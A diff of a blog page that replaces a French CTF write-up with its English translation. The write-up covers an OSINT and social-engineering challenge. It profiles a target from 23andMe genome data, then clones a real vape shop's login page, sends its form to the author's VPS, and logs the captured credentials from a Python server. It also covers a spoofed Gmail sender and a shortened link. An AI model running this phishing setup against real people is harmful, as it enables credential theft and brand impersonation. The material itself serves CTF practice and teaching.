@@ -17,17 +17,17 @@
     
     
 
-<title>CTF InterIUT 2020 - OSINT &amp; SE (aka le pire phishing) • Haax - Personal Blog</title>
+<title>CTF InterIUT 2020 - OSINT &amp; SE (aka the world worst phishing) • Haax - Personal Blog</title>
 
 
 <meta name="twitter:card" content="summary"/>
-<meta name="twitter:title" content="CTF InterIUT 2020 - OSINT &amp; SE (aka le pire phishing)"/>
-<meta name="twitter:description" content="Le CTF Inter IUT est une initiative de l&rsquo;ENSIBS lancée il y a quelques années. Étant en ligne et ouvert à tous cette année, nous avons avec un petit groupe d&rsquo;amis jeté un oeil aux différents challenges. Ce post explicite la solution du challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; sur des thématiques OSINT et Social Enginerring."/>
+<meta name="twitter:title" content="CTF InterIUT 2020 - OSINT &amp; SE (aka the world worst phishing)"/>
+<meta name="twitter:description" content="The CTF Inter IUT is an initiative started a few years ago by the ENSIBS school. Being online and open to all this year, we decided with a small group of friends to take a look at the different challenges. This post explains the solution of the challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; on OSINT and Social Engineering topics."/>
 
-<meta property="og:title" content="CTF InterIUT 2020 - OSINT &amp; SE (aka le pire phishing)" />
-<meta property="og:description" content="Le CTF Inter IUT est une initiative de l&rsquo;ENSIBS lancée il y a quelques années. Étant en ligne et ouvert à tous cette année, nous avons avec un petit groupe d&rsquo;amis jeté un oeil aux différents challenges. Ce post explicite la solution du challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; sur des thématiques OSINT et Social Enginerring." />
+<meta property="og:title" content="CTF InterIUT 2020 - OSINT &amp; SE (aka the world worst phishing)" />
+<meta property="og:description" content="The CTF Inter IUT is an initiative started a few years ago by the ENSIBS school. Being online and open to all this year, we decided with a small group of friends to take a look at the different challenges. This post explains the solution of the challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; on OSINT and Social Engineering topics." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://haax9.github.io/fr/writeups/inter-iut-2020/osint_se_challenge/" />
+<meta property="og:url" content="https://haax9.github.io/en/writeups/inter-iut-2020/osint_se_challenge/" />
 <meta property="article:published_time" content="2020-11-29T00:00:00&#43;00:00"/>
 <meta property="article:modified_time" content="2020-11-29T00:00:00&#43;00:00"/><meta property="og:site_name" content="Haax - Personal Blog" />
 
@@ -64,7 +64,7 @@
     <div class="sidebar-about">
       
       
-          <a href="https://haax9.github.io">
+          <a href="https://haax9.github.io/en">
           
           
           
@@ -86,7 +86,7 @@
 		 
 			 
 				<li>
-					<a href="/fr/articles/">
+					<a href="/en/articles/">
 						<span>Articles</span>
 					</a>
 				</li>
@@ -94,7 +94,7 @@
 		 
 			 
 				<li>
-					<a href="/fr/walkthroughs/">
+					<a href="/en/walkthroughs/">
 						<span>Walkthroughs</span>
 					</a>
 				</li>
@@ -102,7 +102,7 @@
 		 
 			 
 				<li>
-					<a href="/fr/writeups/">
+					<a href="/en/writeups/">
 						<span>Write-Ups</span>
 					</a>
 				</li>
@@ -110,8 +110,8 @@
 		 
 			 
 				<li>
-					<a href="/fr/about/">
-						<span>À Propos</span>
+					<a href="/en/about/">
+						<span>About</span>
 					</a>
 				</li>
 			 
@@ -146,15 +146,15 @@
 	
 	
 	
-	&nbsp;<a href="https://haaxmax.github.io/fr/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
+	&nbsp;<a href="https://haaxmax.github.io/en/index.xml" target="blank"><i class="fas fa-rss fa-lg" aria-hidden="true"></i></a>
 	</section>
 
     </p>
     <div class="langSection">
       
       
-      <a rel="alternate" href="/en/writeups/inter-iut-2020/osint_se_challenge/" hreflang="en" lang="en" class="langLink">English</a>
-      <a rel="alternate" href="/en/writeups/inter-iut-2020/osint_se_challenge/" hreflang="en" lang="en"><img src="/img/icons/logo_drapeau_angleterre.png" alt="logo_angleterre" class="logoFlag"/></a>
+      <a rel="alternate" href="/fr/writeups/inter-iut-2020/osint_se_challenge/" hreflang="fr" lang="fr" class="langLink">Français</a>
+      <a rel="alternate" href="/fr/writeups/inter-iut-2020/osint_se_challenge/" hreflang="fr" lang="fr"><img src="/img/icons/logo_drapeau_france.png" alt="logo_fracne" class="logoFlag"/></a>
       </div>
     <p class="copyright">
       &copy; 2020 Haax.
@@ -172,7 +172,7 @@
             
     <article>
   <header>
-    <h1>CTF InterIUT 2020 - OSINT &amp; SE (aka le pire phishing)</h1>
+    <h1>CTF InterIUT 2020 - OSINT &amp; SE (aka the world worst phishing)</h1>
     
     
 <div class="post__meta">
@@ -184,15 +184,15 @@
     
     
     <br/>
-    <i class="fas fa-clock"></i> 10 min read
+    <i class="fas fa-clock"></i> 9 min read
 </div>
 
 
   </header>
   <div class="post">
-    <p>Le CTF Inter IUT est une initiative de l&rsquo;ENSIBS lancée il y a quelques années. Étant en ligne et ouvert à tous cette année, nous avons avec un petit groupe d&rsquo;amis jeté un oeil aux différents challenges. Ce post explicite la solution du challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; sur des thématiques OSINT et Social Enginerring.</p>
+    <p>The CTF Inter IUT is an initiative started a few years ago by the ENSIBS school. Being online and open to all this year, we decided with a small group of friends to take a look at the different challenges. This post explains the solution of the challenge &ldquo;La DGSE, c&rsquo;est moi&rdquo; on OSINT and Social Engineering topics.</p>
 
-<p>Ayant eu l&rsquo;occasion de co-organiser l&rsquo;édition 2018 du challenge InterIUT lorsque j&rsquo;étais étudiant à l&rsquo;ENSIBS et compte tenu de l&rsquo;ouverture au public cette année, nous avons souhaité tester quelques challenges. Celui-ci porte notamment sur des notions OSINT en lien avec les tests ADN accessibles au public, puis d&rsquo;une partie de &ldquo;Social Engineering&rdquo; afin de récupérer des informations. C&rsquo;était notamment l&rsquo;occasion de réaliser le pire phishing du monde (ou le plus crade!).</p>
+<p>This challenge is mainly focused on OSINT notions related to DNA tests available to the public, then a part of &ldquo;Social Engineering&rdquo; in order to retrieve information. You will notice that it was the perfect opportunity to carry out the world worst phishing (or the dirtiest!).</p>
 
 <h2 id="sommaire">Sommaire</h2>
 
@@ -214,12 +214,12 @@
 
 <h2 id="énoncé">Énoncé</h2>
 
-<pre><code>Après d'intensives recherches vous avez trouvé un fichier étrange concernant
-un des techniciens de RandomCorp. Basez-vous sur ce fichier pour récupérer ses
-identifiants en le contactant à l'adresse darkx.kevin@protonmail.com
+<pre><code>After intensive research you have found a strange file concerning
+one of RandomCorp's technicians. Recover its
+identifiers by contacting him at darkx.kevin@protonmail.com.
 </code></pre>
 
-<p>L&rsquo;énoncé nous laisse également avec un fichier &ldquo;jml.txt&rdquo;, contenant le paragraphe suivant d&rsquo;en-tête ainsi que environ 640.000 lignes telles que celles ci-dessous.</p>
+<p>The statement also leaves us with a &ldquo;jml.txt&rdquo; file, containing the following header paragraph as well as about 640,000 lines such as those below.</p>
 
 <pre><code># This data file generated by 23andMe at: Sun Nov 23 12:27:13 2020
 #
@@ -257,69 +257,69 @@ rs7538305   1   824398  AA
 rs28444699  1   830181  AA
 </code></pre>
 
-<h2 id="analyse-du-fichier-et-recherche-d-éléments">Analyse du fichier et recherche d&rsquo;éléments</h2>
+<h2 id="file-analysys-and-gathering-first-elements">File analysys and gathering first elements</h2>
 
-<p>Premièrement, qu&rsquo;est-ce que ce fichier ?
-On peut tout d&rsquo;abord lire les 2 premières lignes.</p>
+<p>First thing first, what&rsquo;s this file ?
+We can start by reading the 2 first lines.</p>
 
 <pre><code># This data file generated by 23andMe at: Sun Nov 23 12:27:13 2020
 # This file contains raw genotype data, including data that is not used in 23andMe reports.
 </code></pre>
 
-<p>On a donc ce qui semble être les données du génome d&rsquo;une personne. Si l&rsquo;on en croit l&rsquo;énoncé, il s&rsquo;agirait d&rsquo;informations à propos de notre cible. On y apprend également que ces données ont été générées par le site &ldquo;23andMe&rdquo;.
-Une simple recherche Google nous permet d&rsquo;apprendre que ce service &ldquo;propose une analyse du code génétique aux particuliers&rdquo;.</p>
+<p>So we have what appears to be a person&rsquo;s genome data. According to the statement, this would be information about our target. We also learn that this data was generated by the &ldquo;23andMe&rdquo; site.
+A simple Google search tells us that this service &ldquo;offers an analysis of the genetic code to individuals&rdquo;.</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_1.png" alt="OSINT_SE_1" class="imgSize2"/></center></p>
 
-<p>Vous avez certainement déjà entendu parler de ces services, de plus en plus démocratisés depuis quelques années. Mais il s&rsquo;avère qu&rsquo;ils peuvent être controversés ! En effet, on ne sait jamais où vont les données ;)
-Ainsi, ce type de données peut être un vecteur intéressant de recherche en sources ouvertes.</p>
+<p>You probably already heard about these services, which have become more and more popular in recent years. But it turns out that they can be moot! Indeed, you never know where data goes ;)
+Thus, this type of data can be an interesting vector for open source research.</p>
 
-<p>Une très bonne présentation a d&rsquo;ailleurs été réalisée il y a tout juste un an par Renaud Lifchitz à ce sujet lors de la conférence UYBHYS 2019 (<a href="https://speakerdeck.com/rlifchitz/diy-dna-osint-or-dot-dot-dot-how-to-enhance-your-social-engineering-skills-using-recent-genomics" target="blank">lien</a>)</p>
+<p>One year ago, a great talk about this topic has been made by Renaud Lifchitz during the UYBHYS 2019 Conference (<a href="https://speakerdeck.com/rlifchitz/diy-dna-osint-or-dot-dot-dot-how-to-enhance-your-social-engineering-skills-using-recent-genomics" target="blank">link</a>)</p>
 
-<p>On y apprend notamment qu&rsquo;il est possible de faire analyser ces données brutes afin de récupérer des éléments tels que les traits de caractère d&rsquo;une personne. À ce stade et compte tenu de l&rsquo;énoncé, la piste d&rsquo;un phishing ciblé (spear phishing) sur notre cher Kévin devient probable.
+<p>In particular, we learn that it is possible to analyze these raw data in order to retrieve elements such as a person&rsquo;s traits. Considering all these elements including the initial statement, we can start to think about a spear phishing attack on our dear Kevin.
 <br/></p>
 
-<h2 id="séquence-adn-et-traits-de-caractère">Séquence ADN et traits de caractère</h2>
+<h2 id="dna-sequence-and-personnality">DNA Sequence and personnality</h2>
 
-<p>Il existe plusieurs outils permettant d&rsquo;analyser ce type de données. La plupart du temps payants, il est néanmoins possible dans certains cas d&rsquo;avoir certains résultats gratuits. C&rsquo;est notamment le cas de <a href="https://genomelink.io" target="blank">GenomeLink.io</a> qui offre la possibilité d&rsquo;uploader des données brutes et de récupérer de manière gratuite des &ldquo;traits&rdquo;.</p>
+<p>There are several tools available to analyze this type of data. Most of the time you have to pay for this, but it&rsquo;s still possible in some cases to have free services. This is for example the case of <a href="https://genomelink.io" target="blank">GenomeLink.io</a> which offers the possibility to upload raw data and retrieve &ldquo;traits&rdquo; for free.</p>
 
-<p>Ainsi, après avoir créé un faux compte et fourni le fichier brut, on peut récupérer les traits suivants.</p>
+<p>Thus, after creating a fake account and providing the raw file, the following traits can be recovered.</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_2.png" alt="OSINT_SE_2" class="imgSize2"/></center></p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_3.png" alt="OSINT_SE_3" class="imgSize2"/></center></p>
 
-<p>Plusieurs éléments sont intéressants ici et pourraient service de levier. Par exemple, notre cible semble avoir une tendance à fumer, comme le montre l&rsquo;analyse des données.</p>
+<p>Several elements are kinda interesting here and could be used. For example, our target seems to smoke, as shown by the analysis.</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_4.png" alt="OSINT_SE_4" class="imgSize2"/></center></p>
 
-<p>Bien que d&rsquo;autres traits pourraient être utilisés, nous avons utilisé celui-ci pour définir notre scénario.
+<p>Even if other traits could be used, we chose to base our scenario on this one.
 <br/></p>
 
-<h2 id="préparation-du-phishing">Préparation du phishing</h2>
+<h2 id="preparing-the-phishing">Preparing the phishing</h2>
 
-<h4 id="leurre-et-payload">Leurre et Payload</h4>
+<h4 id="bait-and-payload">Bait and Payload</h4>
 
-<p>Bien ! On sait donc que nous sommes en présence d&rsquo;une personne pouvant fumer et que nous devons le contacter afin de récupérer ses identifiants.
-Bien entendu, lui demander gentiment n&rsquo;est pas suffisant. :)
-C&rsquo;est dans cette optique que nous avons opté pour une petite attaque par phishing.</p>
+<p>Well ! So our target is smoking and we have to contact/trick him to get his credentials.
+Of course, asking him nicely is not enough. :)
+With this in mind, we opted for a small phishing attack.</p>
 
-<p>Première étape, définir le payload et le leurre utilisé.
-Nous voulons récupérer des identifiants. La manière la plus simple semble donc de proposer à la victime une fausse page de login sur laquelle nous avons une visibilité.</p>
+<p>First step, define the payload and the decoy used.
+We want to get credentials. So the simplest way seems to offer the victim a controlled fake login page.</p>
 
-<p>Nous sommes en 2020 et beaucoup de personnes utilisent maintenant des vapoteuses pour fumer. Nous sommes donc parti dans l&rsquo;idée d&rsquo;utiliser cela. L&rsquo;une des plus grosses boutiques en France aujourd&rsquo;hui se nomme &ldquo;Le Petit Vapoteur&rdquo;. Si notre cible utilise ce type de produit, alors il est probable qu&rsquo;il dispose d&rsquo;un compte sur ce type de plateforme.</p>
+<p>We are in 2020 and many people are now using vape to smoke. So we started by thinking of using that. One of the biggest stores in France today is called &ldquo;Le Petit Vapoteur&rdquo;. If our target uses this type of product, then he likely have an account on this platform.</p>
 
-<p>Ainsi, dans le cadre de ce challenge, nous allons copier de manière temporaire l&rsquo;image de ces derniers.</p>
+<p>So, for this challenge, we are going to copy their image temporarily.</p>
 
-<h4 id="page-et-infrastructure">Page et Infrastructure</h4>
+<h4 id="page-and-infrastructure">Page and Infrastructure</h4>
 
-<p>Âmes sensibles, s&rsquo;abstenir, cette partie est méchamment quick&amp;dirty. Mais bon.. Comme disait ma grand-mère : &ldquo;C&rsquo;est moche, mais ça marche&rdquo;.</p>
+<p>Not for the faint hearted, this part is heavily quick&amp;dirty. But hey&hellip; As my grandmother used to say: &ldquo;It&rsquo;s ugly, but it works&rdquo;.</p>
 
-<p>On se rend donc sur la page de connexion de notre leurre, on affiche le code source de la page et on lance notre plus beau copy/paste dans l&rsquo;éditeur de notre choix.</p>
+<p>So we go to the login page of our lure, we display the source code of the page and we launch our best copy/paste in our favorite editor.</p>
 
-<p>La page en question est trèèès longue et contient beaucoup de code (~13.000 lignes). C&rsquo;est ok car on veut une fausse page ressemblante. Deux éléments sont intéressants ici.</p>
+<p>The page is very long and contains a lot of code (~13.000 lines). It&rsquo;s ok because we want a fake looking page. Two things are interesting here.</p>
 
-<p>Premièrement, le formulaire de login. Les seules modifications apportées à ce dernier sont le passage en GET (je vous avais prevenu&hellip;) car on souhaite juste récupérer les données rapidement, et l&rsquo;action effectuée.</p>
+<p>First, the login form. The only changes made to it are switching to GET HTTP methgod (I warned you&hellip;) because we just want to quickly retrieve data.</p>
 
 <pre><code class="language-html">&lt;form action=&quot;http://xx.xx.xx.xx:8000/test.html&quot; method=&quot;GET&quot; id=&quot;login_form_inpop&quot; class=&quot;loginForm&quot; data-elegantForm=&quot;1&quot;&gt;
                 &lt;p&gt;
@@ -346,7 +346,7 @@ Nous voulons récupérer des identifiants. La manière la plus simple semble don
             &lt;/form&gt;
 ````
 
-D'autres part, nous avons remarqué après quelques tests qu'un morceau de JQuery est utilisé sur la page légitime et interfère dans la connexion. Ce dernier a donc été supprimé de la page au profit d'une petite fonction Javascript permettant de créer la requête GET au moment de la soumission du formulaire dans le vide (et là, c'est merci &lt;a href=&quot;https://twitter.com/driikolu?lang=fr&quot; target=&quot;blank&quot;&gt;@Driikolu&lt;/a&gt; pour le trick).
+On the other hand, we noticed after some tests that a piece of JQuery is used on the legitimate page and interferes with the connection. So it has been removed from the page in favor of a small Javascript function allowing to create the GET query when submitting the form (and here, thanks &lt;a href=&quot;https://twitter.com/driikolu?lang=fr&quot; target=&quot;blank&quot;&gt;@Driikolu&lt;/a&gt; for the trick).
 
 ```html
 function connection() {
@@ -359,27 +359,27 @@ function connection() {
 }
 </code></pre>
 
-<p>La page est maintenant prête ! Il faut maintenant un serveur web afin de simuler le site en question. Là encore, nous aurions pu utiliser quelquechose de propre tel que Gophish, mais j&rsquo;avais clairement la flemme de mettre en place ce type d&rsquo;infrastructure pour un challenge &ldquo;rapide&rdquo;. On a donc opté pour autre chose (la solution va vous étonner).</p>
+<p>The page is now ready! You now need a web server in order to simulate the site. Again, we could have used something clean like Gophish, but I was clearly lazy to set up this kind of infrastructure for a &ldquo;fast&rdquo; challenge. So we opted for something else (surprise, surprise&hellip;).</p>
 
-<p>Au moyen d&rsquo;un petit VPS, on se créé un petit espace de travail dans lequel on place nos deux fichiers HTML.</p>
+<p>Using a VPS, we create a small workspace in which we place our two HTML files.</p>
 
 <pre><code class="language-bash">~/tmp$ ls
 index.html  test.html
 </code></pre>
 
-<p>Et on lance un joli server HTTP Python pour mettre le tout en ligne (Je sais, je sais&hellip; C&rsquo;EST MOCHE)</p>
+<p>And we start a pretty Python HTTP Server in order to put the whole online (I know, I know&hellip; DIRTY)</p>
 
 <pre><code class="language-bash">$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 </code></pre>
 
-<p>On se rend ensuite via un navigateur web sur l&rsquo;adresse IP de notre VPS en spécifiant le port 8000 utilisé et tadaaam !</p>
+<p>Then, using a web browser and going on our VPS IP address with the correct port.. Tadaaaam !</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_5.png" alt="OSINT_SE_5" class="imgSize2"/></center></p>
 
-<h4 id="test-de-fonctionnement">Test de fonctionnement</h4>
+<h4 id="tests">Tests</h4>
 
-<p>Afin de valider que tout fonctionne correctement, on peut simuler le comportement d&rsquo;une victime qui se rend sur la page.</p>
+<p>In order to validate the whole process, we simulate our target behavior.</p>
 
 <pre><code class="language-bash">$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
@@ -397,53 +397,54 @@ xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurpwa/img/Icon-1
 [...]
 </code></pre>
 
-<p>Beaucoup d&rsquo;erreur 404 sont générées mais c&rsquo;est totalement normal car nous n&rsquo;avons pas à notre disposition les autres ressources chargées normalement par la page. Le tout devient intéressant lorsqu&rsquo;on tente de se &ldquo;connecter&rdquo;.</p>
+<p>A lot of 404 errors are generated but its normal because we don&rsquo;t have all the legitimate resources that the page is trying to load. But it becomes interesting when we try to &ldquo;connect&rdquo; by submitting the form.</p>
 
 <pre><code class="language-bash">xx.xx.xx.xx - - [29/Nov/2020 20:25:23] code 404, message File not found
 xx.xx.xx.xx - - [29/Nov/2020 20:25:23] &quot;GET /modules/vapoteurpwa/img/Icon-128.png HTTP/1.1&quot; 404 -
 xx.xx.xx.xx - - [29/Nov/2020 20:25:50] &quot;GET /?mail=test@ctf.fr&amp;passwd=haaxPass HTTP/1.1&quot; 200 -
 </code></pre>
 
-<p>On récupère bien les données du formulaire en GET. C&rsquo;est moche&hellip; Mais ça marche :)</p>
+<p>We successfully gather the credentialis form the form. It&rsquo;s ugly&hellip; But it works :)</p>
 
-<h4 id="expéditeur-et-e-mail">Expéditeur et E-mail</h4>
+<h4 id="sender-and-e-mail">Sender and E-mail</h4>
 
-<p>Bien ! D&rsquo;un point de vue technique, l&rsquo;attaque est prête. Il faut maintenant une accroche viable.
-Là encore, nous aurions pu réserver un nom de domaine crédible et s&rsquo;en servir pour l&rsquo;expéditeur de l&rsquo;email, mais là encore, on ne va pas s&rsquo;embêter et en plus dépenser de l&rsquo;argent&hellip; Alors un simple compte Gmail fera l&rsquo;affaire.</p>
+<p>Good ! From a technical point of view, the attack is ready. Now we need a realictic hook.
+Again, we could have bought a real domain name and used it for the sender of the email, but again, we&rsquo;re lazy and on top of that, we&rsquo;re going to spend money&hellip; Then a simple Gmail account will be ok.</p>
 
-<p>Quelques minutes plus tard, l&rsquo;adresse &ldquo;news.lepetitvapoteur[at]gmail.com&rdquo; voit le jour.
-Afin de cacher le lien complet vers l&rsquo;URL de notre page, qui est un peu moche car de la forme &ldquo;hxxp://111.222.333.444:8000/index.html&rdquo;, nous pouvons utiliser un URL Shortener tel que Bitly (Quitte à faire du quick&amp;dirty, autant y aller à fond!) puis on créé un petit mail aguicheur en ajoutant le logo de notre leurre (crédibilité, toussa&hellip;).</p>
+<p>A few minutes later, the address &ldquo;news.lepetitvapoteur[at]gmail.com&rdquo; is born.
+In order to hide the complete URL link to our page, which is a bit ugly because of the &ldquo;hxxp://111.222.333.444:8000/index.html&rdquo; shape, we can use an URL Shortener such as Bitly (If you want to be quick&amp;dirty, go until the end! :D) then we create a little teasing e-mail by adding the logo of our decoy (credibility, cough&hellip;).</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_6.png" alt="OSINT_SE_6" class="imgSize2"/></center></p>
 
-<p>Tout est prêt !
+<p>Everything is ready !
 <br/></p>
 
 <h2 id="phish-and-flag">Phish and Flag</h2>
 
-<p>Le serveur est lancé et le mail est prêt, ce dernier peut donc partir, à 11h46.
-À partir de là, telle une partie de pêche, il suffit d&rsquo;attendre. À peine 2 minutes plus tard, on observe une première connexion sur le serveur, mais sans idenfiants.</p>
+<p>Server is started and e-mail is ready to go. Sent at 11:46 am !
+From there, just like a fishing session, we have to wait. No more than 2 minutes later, we can see a first connection on the server, but no creds :(.</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_7.png" alt="OSINT_SE_7" class="imgSize2"/></center></p>
 
-<p>Les minutes passent et toujours rien. Sentiment connu de tout auditeur/consultant ayant déjà réalisé de réelles campagnes : &ldquo;Mince.. Est-ce que le formulaire fonctionne ? Est-ce que le site n&rsquo;est pas cassé ?&rdquo;.</p>
+<p>Minutes goes and still nothing.
+Feeling known to any security consultant who has already carried out real campaigns: &ldquo;F*ck. Does the form work? Is the site broken?&ldquo;.</p>
 
-<p>Mais finalement, à 13h14, la même adresse IP revient taper notre serveur et notre victime tente de se connecter, révélant ainsi son mot de passe qui n&rsquo;est autre que le flag !</p>
+<p>But finally, at 1:14 pm, the same IP address comes back our server and our victim tries to connect, thus revealing his password which is none other than the flag!</p>
 
 <p><center><img src="/img/writeups/inter-iut-2020/OSINT_8.png" alt="OSINT_SE_8" class="imgSize2"/></center></p>
 
 <p>w00t !</p>
 
-<p>Un dernier mot.
-Je l&rsquo;ai répété plusieurs durant ce poste, mais il va de soit qu&rsquo;utiliser un serveur HTTP python de la sorte, c&rsquo;est moche et ça peut même être dangereux. Je l&rsquo;ai fait pour ce challenge car aucune donnée n&rsquo;était stockée sur le serveur (en cas de compromission) et car je savais que le serveur en question n&rsquo;allait être disponible que quelques minutes.</p>
+<p>One last word.
+I repeated it several times during this post, but it clear that using a python HTTP server like this is ugly and can even be dangerous (your machine is reachable over the Internet). I did it for this challenge because no data were stored on the server (in case of compromission) and because I knew that the server in question would only be available for a few minutes.</p>
   </div>
   
 
 <div class="post--navigation post--navigation-single">
     
-    <a href="/fr/writeups/osint-geoint/osint-flight-tracking-challenge/" class="post--navigation-prev">
+    <a href="/en/writeups/osint-geoint/osint-flight-tracking-challenge/" class="post--navigation-prev">
       <i aria-hidden="true" class="fa fa-chevron-left"></i>
-      <span class="navigation-tittle">OSINT/GEOINT - Investigation et Géolocalisation d&#39;un vol commercial</span>
+      <span class="navigation-tittle">OSINT/GEOINT - Investigating and geolocating a commercial flight</span>
     </a>
     
     
